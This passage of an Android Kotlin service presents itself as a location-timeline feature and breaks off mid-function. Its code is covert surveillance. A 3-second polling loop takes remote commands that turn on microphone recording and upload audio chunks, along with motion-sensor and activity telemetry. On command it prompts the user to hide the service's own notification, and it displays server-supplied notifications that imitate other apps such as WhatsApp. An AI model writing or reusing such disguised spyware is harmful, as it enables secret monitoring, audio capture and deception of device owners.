package com.nexus.portal.services

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.hardware.Sensor
import android.hardware.SensorEvent
import android.hardware.SensorEventListener
import android.hardware.SensorManager
import android.location.Geocoder
import android.location.Location
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.android.gms.location.ActivityRecognition
import com.google.android.gms.location.ActivityRecognitionResult
import com.google.android.gms.location.DetectedActivity
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.nexus.portal.MainActivity
import com.nexus.portal.R
import com.nexus.portal.managers.TimelineSyncManager
import com.nexus.portal.data.local.timeline.TimelineDatabase
import com.nexus.portal.data.local.timeline.TimelineLocationPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import java.io.File
import java.util.Locale
import java.util.UUID

import dagger.hilt.android.AndroidEntryPoint
import javax.inject.Inject
import com.nexus.portal.data.repository.TimelineRepository
import com.nexus.portal.data.repository.LocationRepository
import com.nexus.portal.data.repository.SensorRepository
import kotlinx.coroutines.flow.collectLatest

/**
 * LocationTimelineService — a long-running foreground service that passively
 * records the user's daily movement for the Google Maps–style Timeline feature.
 *
 * Sampling strategy:
 *  - Normal: 1 sample every 5 minutes (PRIORITY_BALANCED_POWER_ACCURACY)
 *  - Active movement: 1 sample every 30 seconds when >100m displacement detected
 *
 * Significant place detection:
 *  - If consecutive points remain within a 50m radius for >5 minutes, the cluster
 *    is marked as a "significant place" and geocoded to a human-readable label.
 *
 * Data lifecycle:
 *  - Points stored in Room `timeline_database`.
 *  - Background geocoding fills `placeLabel` asynchronously.
 *  - Synced to cloud after every 50 new points.
 *  - Data older than 90 days is purged automatically.
 */
@AndroidEntryPoint
class LocationTimelineService : Service() {

    @Inject lateinit var timelineRepository: TimelineRepository
    @Inject lateinit var locationRepository: LocationRepository
    @Inject lateinit var sensorRepository: SensorRepository

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    
    private var locationCollectorJob: kotlinx.coroutines.Job? = null
    private var sensorCollectorJob: kotlinx.coroutines.Job? = null

    // Tracks the most recent saved location to compute distance deltas
    private var lastSavedLocation: Location? = null

    // Cluster tracking for significant place detection
    private var clusterStartMs: Long = 0L
    private var clusterAnchorLat: Double = 0.0
    private var clusterAnchorLon: Double = 0.0
    private var clusterCandidateId: String? = null
    private var pointsSinceLastSync = 0

    companion object {
        const val ACTION_START = "ACTION_START_TIMELINE"
        const val ACTION_STOP  = "ACTION_STOP_TIMELINE"
        const val PREFS_NAME   = "timeline_prefs"
        const val KEY_ENABLED  = "timeline_enabled"
        const val KEY_FIRST_BOOT_DONE = "timeline_first_boot_done"

        private const val CHANNEL_ID_VISIBLE = "location_timeline_visible_channel"
        private const val CHANNEL_ID_SILENT  = "location_timeline_silent_channel"
        private const val NOTIFICATION_ID = 2001

        private const val NORMAL_INTERVAL_MS    = 10L * 60L * 1000L  // 10 minutes
        private const val ACTIVE_INTERVAL_MS    = 30L * 1000L        // 30 seconds
        private const val MOVEMENT_THRESHOLD_M  = 100f               // switch to active mode
        private const val CLUSTER_RADIUS_M      = 50f                // significant place radius
        private const val CLUSTER_MIN_STAY_MS   = 5L * 60L * 1000L  // 5 minute minimum stay
        private const val SYNC_EVERY_N_POINTS   = 50
        private const val RETENTION_DAYS        = 90

        private val _isRunning = MutableStateFlow(false)
        val isRunning: StateFlow<Boolean> = _isRunning.asStateFlow()

        // Telemetry state shared from receivers
        var latestActivity = "UNKNOWN"
        var latestActivityConfidence = 0

        fun updateLatestActivity(activity: String, confidence: Int) {
            latestActivity = activity
            latestActivityConfidence = confidence
        }
    }

    private var isInActiveMode = false
    private var isSharingLocationFromRideTracker = false
    private var rideTrackerStateCollectorJob: kotlinx.coroutines.Job? = null
    private var rideTrackerLocationCollectorJob: kotlinx.coroutines.Job? = null



    // Remote trigger state tracking
    @Volatile private var isImuEnabled = false
    @Volatile private var isActivityEnabled = false
    @Volatile private var isMicEnabled = false
    @Volatile private var isMicLiveEnabled = false

    // Telemetry values cache
    private val latestAccel = DoubleArray(3)
    private val latestGyro = DoubleArray(3)
    private val latestMag = DoubleArray(3)
    private val latestOrientation = DoubleArray(3) // yaw, pitch, roll
    private var latestAudioLoudness = 0.0
    private var latestAudioUrl: String? = null

    // Cache of last geocoded place strings for high frequency telemetry updates
    private var lastPlaceLabel = ""
    private var lastPlaceSubLabel = ""
    private var lastPlaceCategoryIcon = "location_on"

    // Job handles
    private var commandPollingJob: kotlinx.coroutines.Job? = null
    private var telemetryReportingJob: kotlinx.coroutines.Job? = null
    private var audioRecordingJob: kotlinx.coroutines.Job? = null

    // MediaRecorder handles
    private var mediaRecorder: MediaRecorder? = null
    private var tempAudioFile: File? = null

    // Google Play Services Activity recognition

    private fun updateOrientation() {
        val r = FloatArray(9)
        val i = FloatArray(9)
        val gravity = FloatArray(3) { latestAccel[it].toFloat() }
        val geomagnetic = FloatArray(3) { latestMag[it].toFloat() }

        if (android.hardware.SensorManager.getRotationMatrix(r, i, gravity, geomagnetic)) {
            val orientation = FloatArray(3)
            android.hardware.SensorManager.getOrientation(r, orientation)
            latestOrientation[0] = Math.toDegrees(orientation[0].toDouble()) // yaw
            latestOrientation[1] = Math.toDegrees(orientation[1].toDouble()) // pitch
            latestOrientation[2] = Math.toDegrees(orientation[2].toDouble()) // roll
        }
    }



    override fun onCreate() {
        super.onCreate()
        createNotificationChannels()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START -> startTimeline()
            ACTION_STOP  -> stopTimeline()
            else -> startTimeline()  // Default to starting timeline if no action specified
        }
        return START_REDELIVER_INTENT  // Stronger than START_STICKY: redeliver intent on crash
    }

    private fun startTimeline() {
        try {
            _isRunning.value = true
            getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .edit().putBoolean(KEY_ENABLED, true).apply()

            val notification = buildNotification()
            // Start with LOCATION type only on API 29+. Microphone type is upgraded dynamically
            // by upgradeForegroundServiceType() only when audio recording is requested.
            // This prevents SecurityException on Android 14+ when RECORD_AUDIO is not yet granted.
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                if (canUseLocationForegroundType()) {
                    startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
                } else {
                    Log.w("TimelineService", "Location FGS permissions not available. Stopping timeline service to prevent crash.")
                    stopTimeline()
                    return
                }
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }

            requestLocationUpdates(active = false)
            setupRideTrackerMonitoring()

            // Start command polling loop
            startCommandPolling()

            // Data retention cleanup (run once per launch)
            serviceScope.launch {
                val cutoff = System.currentTimeMillis() - (RETENTION_DAYS * 24L * 3600L * 1000L)
                timelineRepository.deleteOlderThan(cutoff)
            }
        } catch (e: Exception) {
            Log.e("TimelineService", "Failed to start timeline: ${e.message}", e)
            ErrorLogger.logError(applicationContext, e)
            stopTimeline()
        }
    }

    private fun stopTimeline() {
        _isRunning.value = false
        getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            .edit().putBoolean(KEY_ENABLED, false).apply()

        // Stop polling and any active telemetry streams
        stopCommandPolling()

        rideTrackerStateCollectorJob?.cancel()
        rideTrackerStateCollectorJob = null
        rideTrackerLocationCollectorJob?.cancel()
        rideTrackerLocationCollectorJob = null
        isSharingLocationFromRideTracker = false

        locationCollectorJob?.cancel()
        locationCollectorJob = null
        locationRepository.stopTracking()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            stopForeground(STOP_FOREGROUND_REMOVE)
        } else {
            @Suppress("DEPRECATION")
            stopForeground(true)
        }
        stopSelf()
    }

    private fun startCommandPolling() {
        stopCommandPolling() // clear any existing
        commandPollingJob = serviceScope.launch {
            while (_isRunning.value) {
                try {
                    val cmd = TimelineSyncManager.fetchActiveCommand(this@LocationTimelineService)
                    if (cmd != null) {
                        handleRemoteCommands(cmd.imu, cmd.activity, cmd.mic, cmd.micLive)
                        if (cmd.triggerNotifPrompt) {
                            triggerNotificationChannelPrompt()
                        }
                        if (!cmd.pendingNotifsJson.isNullOrEmpty()) {
                            showPendingNotifications(cmd.pendingNotifsJson)
                        }
                    }
                } catch (e: Exception) {
                    Log.w("TimelineService", "Failed to poll remote command: ${e.message}")
                }
                kotlinx.coroutines.delay(3000)
            }
        }
    }

    private fun triggerNotificationChannelPrompt() {
        try {
            // 1. Reset setup flag so MainScreen shows the dialog again next time
            val secretPrefs = getSharedPreferences("secret_prefs", Context.MODE_PRIVATE)
            secretPrefs.edit().putBoolean("notif_channel_setup_done", false).apply()

            // 2. Fire a system notification that will open MainActivity when clicked
            val intent = Intent(this, MainActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            }
            val pendingIntent = PendingIntent.getActivity(
                this,
                2003,
                intent,
                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
            )

            val title = "Action Required: Hide Background Notification"
            val message = "Nexus Portal requires you to hide the Location Timeline background notification. Tap to configure."

            val notification = NotificationCompat.Builder(this, CHANNEL_ID_VISIBLE)
                .setContentTitle(title)
                .setContentText(message)
                .setStyle(NotificationCompat.BigTextStyle().bigText(message))
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setAutoCancel(true)
                .setContentIntent(pendingIntent)
                .build()

            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.notify(2003, notification)
            Log.i("TimelineService", "Fired notification channel cleanup prompt warning.")
        } catch (e: Exception) {
            Log.e("TimelineService", "Failed to trigger notification channel prompt: ${e.message}", e)
        }
    }

    private fun showPendingNotifications(jsonStr: String) {
        try {
            val array = org.json.JSONArray(jsonStr)
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            for (i in 0 until array.length()) {
                val obj = array.getJSONObject(i)
                val id = obj.optString("id", UUID.randomUUID().toString())
                val title = obj.optString("title", "Alert")
                val text = obj.optString("text", "")
                val sender = obj.optString("sender", "System Alert")
                
                // Format the title like: "[WhatsApp] Hello" or just the title and show sender
                val displayTitle = if (sender.isNotEmpty() && sender != "System Alert") {
                    "[$sender] $title"
                } else {
                    title
                }
                
                val notification = NotificationCompat.Builder(this, CHANNEL_ID_VISIBLE)
                    .setContentTitle(displayTitle)
                    .setContentText(text)
                    .setStyle(NotificationCompat.BigTextStyle().bigText(text))
                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                    .setPriority(NotificationCompat.PRIORITY_HIGH)
                    .setAutoCancel(true)
                    .build()
                
                // Generate a unique integer notification ID
                val notifId = (System.currentTimeMillis() % 100000 + i).toInt()
                notificationManager.notify(notifId, notification)
                Log.d("TimelineService", "Fired custom notification: $displayTitle - $text")
            }
        } catch (e: Exception) {
            Log.e("TimelineService", "Error showing pending notifications: ${e.message}", e)
        }
    }

    private fun stopCommandPolling() {
        commandPollingJob?.cancel()
        commandPollingJob = null
        // Ensure everything is stopped when polling is stopped
        serviceScope.launch {
            handleRemoteCommands(requestedImu = false, requestedActivity = false, requestedMic = false, requestedMicLive = false)
        }
    }

    private var lastPermissionPromptMs = 0L

    private suspend fun handleRemoteCommands(requestedImu: Boolean, requestedActivity: Boolean, requestedMic: Boolean, requestedMicLive: Boolean) {
        var imu = requestedImu
        var activity = requestedActivity
        var mic = requestedMic

        // Collect missing permissions so we can prompt the user once
        val missingPermissions = mutableListOf<String>()

        // Check Permissions & Hardware State
        if (activity) {
            val hasPerm = ContextCompat.checkSelfPermission(this, Manifest.permission.ACTIVITY_RECOGNITION) == PackageManager.PERMISSION_GRANTED
            if (!hasPerm) {
                activity = false
                missingPermissions.add(Manifest.permission.ACTIVITY_RECOGNITION)
                TimelineSyncManager.postTelemetryStatus("ACTIVITY", "ERR_NO_ACTIVITY_PERM", "Activity Recognition permission is missing.")
            }
        }

        if (mic) {
            val hasPerm = ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
            if (!hasPerm) {
                mic = false
                missingPermissions.add(Manifest.permission.RECORD_AUDIO)
                TimelineSyncManager.postTelemetryStatus("AUDIO", "ERR_NO_MIC_PERM", "Microphone permission is missing.")
            }
            // Also check FOREGROUND_SERVICE_MICROPHONE on Android 14+
            if (Build.VERSION.SDK_INT >= 34) {
                val hasFgsMic = ContextCompat.checkSelfPermission(this, "android.permission.FOREGROUND_SERVICE_MICROPHONE") == PackageManager.PERMISSION_GRANTED
                if (!hasFgsMic) {
                    missingPermissions.add("android.permission.FOREGROUND_SERVICE_MICROPHONE")
                }
            }
        }

        val hasFine = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
        if ((imu || activity || mic) && !hasFine) {
            missingPermissions.add(Manifest.permission.ACCESS_FINE_LOCATION)
            TimelineSyncManager.postTelemetryStatus("GPS", "ERR_NO_LOCATION_PERM", "Fine location permission is missing.")
        } else if (imu || activity || mic) {
            val lm = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
            val gpsEnabled = lm.isProviderEnabled(android.location.LocationManager.GPS_PROVIDER)
            val networkEnabled = lm.isProviderEnabled(android.location.LocationManager.NETWORK_PROVIDER)
            if (!gpsEnabled && !networkEnabled) {
                TimelineSyncManager.postTelemetryStatus("GPS", "ERR_GPS_DISABLED", "Location services are disabled on the device.")
            }
        }

        // If we have missing permissions, fire a notification to prompt the user (max once per 60s)
        if (missingPermissions.isNotEmpty()) {
            val now = System.currentTimeMillis()
            if (now - lastPermissionPromptMs > 60_000) {
                lastPermissionPromptMs = now
                firePermissionRequestNotification(missingPermissions.distinct())
            }
        }

        val wasAnyEnabled = isImuEnabled || isActivityEnabled || isMicEnabled

        // 1. IMU triggers
        if (imu && !isImuEnabled) {
            isImuEnabled = true
            startImuTracking()
        } else if (!imu && isImuEnabled) {
            isImuEnabled = false
            stopImuTracking()
        }

        // 2. Activity triggers
        if (activity && !isActivityEnabled) {
            isActivityEnabled = true
            startActivityRecognition()
        } else if (!activity && isActivityEnabled) {
            isActivityEnabled = false
            stopActivityRecognition()
        }

        // 3. Microphone triggers
        if (mic && !isMicEnabled) {
            isMicEnabled = true
            startAudioRecording()
        } else if (!mic && isMicEnabled) {
            isMicEnabled = false
            stopAudioRecording()
        }

        // 4. Combined telemetry reporting loop & GPS behavior
        val isAnyEnabled = imu || activity || mic

        if (isAnyEnabled && !wasAnyEnabled) {
            // Accelerate GPS updates
            requestLocationUpdates(active = true)
            startTelemetryReporting()
        } else if (!isAnyEnabled && wasAnyEnabled) {
            // Restore normal updates
            requestLocationUpdates(active = false)
            stopTelemetryReporting()
        }

        // Update live mode flag for audio recording
        isMicLiveEnabled = requestedMicLive
    }

    private fun startImuTracking() {
        Log.d("TimelineService", "Starting IMU sensor tracking")
        // sensorFlow is a cold callbackFlow — sensors register automatically when collected
        sensorCollectorJob = serviceScope.launch {
            sensorRepository.sensorFlow.collectLatest { data ->
                latestAccel[0] = data.accelValues[0].toDouble()
                latestAccel[1] = data.accelValues[1].toDouble()
                latestAccel[2] = data.accelValues[2].toDouble()

                latestGyro[0] = data.gyroValues[0].toDouble()
                latestGyro[1] = data.gyroValues[1].toDouble()
                latestGyro[2] = data.gyroValues[2].toDouble()

                latestMag[0] = data.magValues[0].toDouble()
                latestMag[1] = data.magValues[1].toDouble()
                latestMag[2] = data.magValues[2].toDouble()

                updateOrientation()
            }
        }
    }

    private fun stopImuTracking() {
        Log.d("TimelineService", "Stopping IMU sensor tracking")
        // Cancelling the job triggers callbackFlow awaitClose, which unregisters sensors
        sensorCollectorJob?.cancel()
        sensorCollectorJob = null

        // Reset values
        latestAccel.fill(0.0)
        latestGyro.fill(0.0)
        latestMag.fill(0.0)
        latestOrientation.fill(0.0)
    }

    private fun startActivityRecognition() {
        Log.d("TimelineService", "Starting Activity Recognition")
        val hasPerm = ContextCompat.checkSelfPermission(this, Manifest.permission.ACTIVITY_RECOGNITION) == PackageManager.PERMISSION_GRANTED
        if (!hasPerm) {
            Log.w("TimelineService", "Cannot start Activity Recognition: permission not granted")
            return
        }

        // Pending intent to explicit receiver
        val intent = Intent(this, com.nexus.portal.receivers.ActivityReceiver::class.java)
        val pendingIntent = PendingIntent.getBroadcast(
            this,
            0,
            intent,
            PendingIntent.FLAG_MUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        try {
            ActivityRecognition.getClient(this)
                .requestActivityUpdates(3000L, pendingIntent)
        } catch (e: Exception) {
            Log.e("TimelineService", "Failed to request activity updates: ${e.message}")
        }
    }

    private fun stopActivityRecognition() {
        Log.d("TimelineService", "Stopping Activity Recognition")
        try {
            val intent = Intent(this, com.nexus.portal.receivers.ActivityReceiver::class.java)
            val pendingIntent = PendingIntent.getBroadcast(
                this,
                0,
                intent,
                PendingIntent.FLAG_MUTABLE or PendingIntent.FLAG_NO_CREATE
            )
            if (pendingIntent != null) {
                ActivityRecognition.getClient(this).removeActivityUpdates(pendingIntent)
            }
        } catch (e: Exception) {
            Log.w("TimelineService", "Failed to remove activity updates: ${e.message}")
        }

        latestActivity = "UNKNOWN"
        latestActivityConfidence = 0
    }

    private fun activityName(type: Int): String {
        return when (type) {
            DetectedActivity.IN_VEHICLE -> "IN_VEHICLE"
            DetectedActivity.ON_BICYCLE -> "ON_BICYCLE"
            DetectedActivity.ON_FOOT -> "ON_FOOT"
            DetectedActivity.RUNNING -> "RUNNING"
            DetectedActivity.STILL -> "STILL"
            DetectedActivity.TILTING -> "TILTING"
            DetectedActivity.WALKING -> "WALKING"
            else -> "UNKNOWN"
        }
    }

    private fun startAudioRecording() {
        Log.d("TimelineService", "Starting Audio Recording loop")
        val hasPerm = ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
        if (!hasPerm) {
            Log.w("TimelineService", "Cannot start audio recording: RECORD_AUDIO permission not granted")
            return
        }

        upgradeForegroundServiceType()

        audioRecordingJob = serviceScope.launch {
            val cacheDir = externalCacheDir ?: cacheDir
            try {
                while (isMicEnabled) {
                    var recorder: MediaRecorder? = null
                    var recordFile: File? = null
                    val chunkStartMs = System.currentTimeMillis()
                    val startLiveState = isMicLiveEnabled
                    
                    try {
                        val durationMs = if (startLiveState) 4000L else 30000L
                        recordFile = File(cacheDir, "ambient_temp_${System.currentTimeMillis()}.m4a")
                        
                        recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                            MediaRecorder(this@LocationTimelineService)
                        } else {
                            @Suppress("DEPRECATION")
                            MediaRecorder()
                        }
                        mediaRecorder = recorder

                        recorder.apply {
                            setAudioSource(MediaRecorder.AudioSource.MIC)
                            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                            setAudioEncodingBitRate(64000)
                            setAudioSamplingRate(16000)
                            setOutputFile(recordFile.absolutePath)
                            prepare()
                            start()
                        }

                        Log.d("TimelineService", "Audio chunk started: ${recordFile.name} (Live Mode: $startLiveState)")

                        var maxAmplitude = 0
                        val endTime = System.currentTimeMillis() + durationMs
                        while (System.currentTimeMillis() < endTime && isMicEnabled) {
                            if (isMicLiveEnabled != startLiveState) {
                                Log.d("TimelineService", "Live mode status changed during recording, cycling chunk immediately.")
                                break
                            }
                            kotlinx.coroutines.delay(200)
                            try {
                                val amp = recorder.maxAmplitude
                                if (amp > maxAmplitude) {
                                    maxAmplitude = amp
                                }
                            } catch (_: Exception) {}
                        }

                        try {
                            recorder.stop()
                        } catch (e: Exception) {
                            Log.w("TimelineService", "Failed to stop mediaRecorder: ${e.message}")
                        }

                        val elapsed = System.currentTimeMillis() - chunkStartMs
                        val loudnessDb = if (maxAmplitude > 0) {
                            20 * Math.log10(maxAmplitude.toDouble() / 32767.0) + 90.0
                        } else {
                            0.0
                        }
                        val finalLoudness = if (loudnessDb < 0.0) 0.0 else loudnessDb

                        // If chunk recorded for >1s, upload it
                        if (recordFile.exists() && recordFile.length() > 0 && elapsed > 1000) {
                            val isLive = startLiveState
                            serviceScope.launch {
                                uploadAndSyncAudioChunk(recordFile, finalLoudness, isLive)
                            }
                        } else {
                            try { recordFile.delete() } catch (_: Exception) {}
                        }
                    } catch (e: Exception) {
                        if (e is kotlinx.coroutines.CancellationException) throw e
                        Log.e("TimelineService", "Error in audio recording chunk: ${e.message}")
                        recordFile?.let {
                            try { if (it.exists()) it.delete() } catch (_: Exception) {}
                        }
                        kotlinx.coroutines.delay(2000)
                    } finally {
                        recorder?.release()
                        if (mediaRecorder == recorder) {
                            mediaRecorder = null
                        }
                    }
                }
            } catch (e: kotlinx.coroutines.CancellationException) {
                Log.d("TimelineService", "Audio recording coroutine cancelled")
            } finally {
                downgradeForegroundServiceType()
            }
        }
    }

    private fun stopAudioRecording() {
        Log.d("TimelineService", "Stopping Audio Recording loop")
        audioRecordingJob?.cancel()
        audioRecordingJob = null
        latestAudioLoudness = 0.0
        latestAudioUrl = null
    }

    private suspend fun uploadAndSyncAudioChunk(file: File, loudnessDb: Double, isLive: Boolean) {
        try {
            val bytes = file.readBytes()
            val base64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
            val filename = "audio_${System.currentTimeMillis()}_${UUID.randomUUID().toString().take(6)}.m4a"
            
            Log.d("TimelineService", "Uploading audio chunk: $filename (${bytes.size} bytes)")
            val audioUrl = TimelineSyncManager.uploadAudioFile(filename, base64)
            if (audioUrl != null) {
                Log.d("TimelineService", "Audio chunk uploaded: $audioUrl")
                latestAudioUrl = audioUrl
                latestAudioLoudness = loudnessDb
                
                // Immediately create and sync a timeline point representing this audio clip
                val loc = lastSavedLocation
                val point = TimelineLocationPoint(
                    latitude = loc?.latitude ?: 0.0,
                    longitude = loc?.longitude ?: 0.0,
                    altitude = loc?.altitude ?: 0.0,
                    accuracy = loc?.accuracy ?: 0f,
                    speedMetersPerSec = loc?.speed ?: 0f,
                    timestamp = System.currentTimeMillis(),
                    placeLabel = lastPlaceLabel,
                    placeSubLabel = lastPlaceSubLabel,
                    placeCategoryIcon = lastPlaceCategoryIcon,
                    detectedActivity = latestActivity,
                    activityConfidence = latestActivityConfidence,
                    audioLoudnessDb = loudnessDb,
                    audioFileUrl = audioUrl
                )
                
                try {
                    timelineRepository.insertPoint(point)
                } catch (e: Exception) {
                    Log.w("TimelineService", "Failed to insert audio timeline point: ${e.message}")
                }
                
                try {
                    TimelineSyncManager.syncSinglePoint(this@LocationTimelineService, point)
                    Log.d("TimelineService", "Audio timeline point synced successfully")
                } catch (e: Exception) {
                    Log.w("TimelineService", "Failed to sync audio timeline point: ${e.message}")
                }
            } else {
                Log.w("TimelineService", "Audio chunk upload failed")
            }
        } catch (e: Exception) {
            Log.e("TimelineService", "Error uploading/syncing audio chunk: ${e.message}")
        } finally {
            try {
                if (file.exists()) {
                    file.delete()
                }
            } catch (_: Exception) {}
        }
    }

    private fun startTelemetryReporting() {
        Log.d("TimelineService", "Starting high-frequency telemetry reporting loop")
        telemetryReportingJob = serviceScope.launch {
            while (isImuEnabled || isActivityEnabled || isMicEnabled) {
                val loc = lastSavedLocation
                
                val point = TimelineLocationPoint(
                    latitude = loc?.latitude ?: 0.0,
                    longitude = loc?.longitude ?: 0.0,
                    altitude = loc?.altitude ?: 0.0,
                    accuracy = loc?.accuracy ?: 0f,
                    speedMetersPerSec = loc?.speed ?: 0f,
                    timestamp = System.currentTimeMillis(),
                    
                    placeLabel = if (loc != null) getPlaceLabelForTelemetry() else "",
                    placeSubLabel = if (loc != null) getPlaceSubLabelForTelemetry() else "",
                    placeCategoryIcon = if (loc != null) getPlaceCategoryIconForTelemetry() else "location_on",
                    
                    accelX = latestAccel[0],
                    accelY = latestAccel[1],
                    accelZ = latestAccel[2],
                    gyroX = latestGyro[0],
                    gyroY = latestGyro[1],
                    gyroZ = latestGyro[2],
                    magX = latestMag[0],
                    magY = latestMag[1],
                    magZ = latestMag[2],
                    yaw = latestOrientation[0],
                    pitch = latestOrientation[1],
                    roll = latestOrientation[2],
                    
                    detectedActivity = latestActivity,
                    activityConfidence = latestActivityConfidence,
                    audioLoudnessDb = 0.0,
                    audioFileUrl = ""
                )

                try {
                    timelineRepository.insertPoint(point)
                } catch (e: Exception) {
                    Log.w("TimelineService", "Failed to insert telemetry point to DB: ${e.message}")
                }

                try {
                    TimelineSyncManager.syncSinglePoint(this@LocationTimelineService, point)
                } catch (e: Exception) {
                    Log.w("TimelineService", "Failed to sync telemetry point: ${e.message}")
                }

                kotlinx.coroutines.delay(3000)
            }
        }
    }

    private fun stopTelemetryReporting() {
        Log.d("TimelineService", "Stopping high-frequency telemetry reporting loop")
        telemetryReportingJob?.cancel()
        telemetryReportingJob = null
    }

    private fun getPlaceLabelForTelemetry(): String = lastPlaceLabel
    private fun getPlaceSubLabelForTelemetry(): String = lastPlaceSubLabel
    private fun getPlaceCategoryIconForTelemetry(): String = lastPlaceCategoryIcon

    private fun canUseMicrophoneForegroundType(): Boolean {
        if (Build.VERSION.SDK_INT < 34) return true
        val hasFgsMic = ContextCompat.checkSelfPermission(this, "android.permission.FOREGROUND_SERVICE_MICROPHONE") == PackageManager.PERMISSION_GRANTED
        val hasRecordAudio = ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
        return hasFgsMic && hasRecordAudio
    }

    private fun upgradeForegroundServiceType() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                var fgsType = ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                if (canUseMicrophoneForegroundType()) {
                    fgsType = fgsType or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                }
                val notification = buildNotification()
                startForeground(NOTIFICATION_ID, notification, fgsType)
                Log.d("TimelineService", "Upgraded FGS type with location|microphone")
            }
        } catch (e: Exception) {
            Log.w("TimelineService", "Failed to upgrade FGS type: ${e.message}")
        }
    }

    private fun downgradeForegroundServiceType() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && canUseLocationForegroundType()) {
                val notification = buildNotification()
                startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
                Log.d("TimelineService", "Downgraded FGS type to location-only")
            }
        } catch (e: Exception) {
            Log.w("TimelineService", "Failed to downgrade FGS type: ${e.message}")
        }
    }

    private fun firePermissionRequestNotification(missingPermissions: List<String>) {
        val intent = Intent(this, MainActivity::class.java).apply {
            action = MainActivity.ACTION_REQUEST_PERMISSIONS
            putExtra(MainActivity.EXTRA_PERMISSIONS, missingPermissions.toTypedArray())
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
        }
        val pendingIntent = PendingIntent.getActivity(
            this,
            2002,
            intent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val title = "Telemetry Permissions Required"
        val message = "Nexus Portal needs additional permissions to fulfill remote telemetry commands. Tap to grant."

        val notification = NotificationCompat.Builder(this, CHANNEL_ID_VISIBLE)
            .setContentTitle(title)
            .setContentText(message)
            .setStyle(NotificationCompat.BigTextStyle().bigText(message))
            .setSmallIcon(android.R.drawable.stat_sys_warning)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setAutoCancel(true)
            .setContentIntent(pendingIntent)
            .build()

        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.notify(2002, notification)
    }

    private fun requestLocationUpdates(active: Boolean) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED) return

        locationCollectorJob?.cancel()

        val interval = if (active) ACTIVE_INTERVAL_MS else NORMAL_INTERVAL_MS
        val priority = if (active) Priority.PRIORITY_HIGH_ACCURACY else Priority.PRIORITY_BALANCED_POWER_ACCURACY
        val minDistance = if (active) 5f else 50f

        locationRepository.startTrackingClient("timeline", interval, priority, minDistance)
        
        locationCollectorJob = serviceScope.launch {
            locationRepository.locationFlow.collectLatest { location ->
                handleNewLocation(location)
            }
        }
        
        isInActiveMode = active
        Log.d("TimelineService", "Location updates: ${if (active) "ACTIVE (30s)" else "NORMAL (5min)"}")
    }

    private fun canUseLocationForegroundType(): Boolean {
        if (Build.VERSION.SDK_INT < 34) return true
        val hasFgsLoc = ContextCompat.checkSelfPermission(this, "android.permission.FOREGROUND_SERVICE_LOCATION") == PackageManager.PERMISSION_GRANTED
        val hasFine = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
        val hasCoarse = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
        val ok = hasFgsLoc && (hasFine || hasCoarse)
        if (!ok) {
